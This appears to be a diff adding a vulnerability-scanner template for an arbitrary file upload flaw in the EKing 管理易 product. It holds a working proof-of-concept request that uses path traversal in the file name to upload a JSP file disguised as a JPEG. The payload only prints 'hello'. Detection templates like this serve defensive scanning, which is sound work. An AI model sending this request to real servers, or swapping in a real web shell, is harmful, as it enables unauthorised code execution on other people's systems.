@@ -1,0 +1,23 @@
+id:
+info:
+  name: EKing-管理易 FileUpload.ihtm 文件上传
+  severity: 4
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /app/FileUpload.ihtm?comm_type=EKING&file_name=../../test2.jsp.
+  data: |
+    Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+    --WebKitFormBoundaryHHaZAYecVOf5sfa6
+    Content-Disposition: form-data; name="uplo_file"; filename="rce.jpg"
+
+    <% out.println("hello");%>
+    --WebKitFormBoundaryHHaZAYecVOf5sfa6--
+response1:
+  body: OK
+  code: 200
+requests2:
+response2:
